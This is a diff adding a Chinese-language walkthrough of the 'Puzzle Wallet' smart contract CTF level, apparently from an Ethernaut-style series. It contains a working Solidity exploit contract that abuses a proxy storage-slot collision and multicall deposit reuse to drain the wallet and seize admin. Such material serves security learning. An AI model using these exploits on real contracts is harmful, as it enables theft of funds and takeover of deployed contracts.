@@ -445,3 +445,50 @@ contract Hack {
 }
 
 ```
+
+## 25. Puzzle Wallet
+
+pendingAdmin和owner在同一个slot, 可以先调用proposeNewAdmin函数, 获得owner权限
+再添加自己为白名单, 获得deposit权限
+multicall函数可以重入, 利用这一点通过multicall函数调用一次deposit和multicall函数(参数也是deposit)来提取资金
+最后通过setMaxBalance函数设置admin
+
+```solidity
+interface PuzzleWallet {
+    function balances(address addr) external view returns (uint256);
+    function admin() external view returns (address);
+    function pendingAdmin() external view returns (address);
+    function maxBalance() external view returns (address);
+    function owner() external view returns (address);
+    function proposeNewAdmin(address _newAdmin) external;
+    function addToWhitelist(address addr) external;
+    function setMaxBalance(uint256 _maxBalance) external;
+    function multicall(bytes[] calldata data) external payable;
+    function execute(address to, uint256 value, bytes calldata data) external payable;
+}
+
+contract Hack {
+    PuzzleWallet d = PuzzleWallet(0x03d610c7078E46c2995b9C254e09a2F6EbA32e25);
+
+    constructor() payable {
+        // 获取权限
+        d.proposeNewAdmin(address(this));
+        d.addToWhitelist(address(this));
+        // 重入调用存入金额
+        bytes memory deposit_call = abi.encodeWithSignature("deposit()");
+        bytes[] memory data = new bytes[](2);
+        data[0] = deposit_call;
+        bytes[] memory dc = new bytes[](1);
+        dc[0] = abi.encodeWithSignature("deposit()");
+        data[1] = abi.encodeWithSignature("multicall(bytes[])", dc);
+        d.multicall{value: msg.value}(data);
+        // 提取金额, maxBalance变为0
+        d.execute(address(this), d.balances(address(this)), bytes(""));
+        // 设置maxBalance变相覆盖admin值
+        d.setMaxBalance(uint256(uint160(address(0x3E9436324544C3735Fd1aBd932a9238d8Da6922f))));
+        selfdestruct(payable(msg.sender));
+    }
+
+    receive() external payable {}
+}
+```
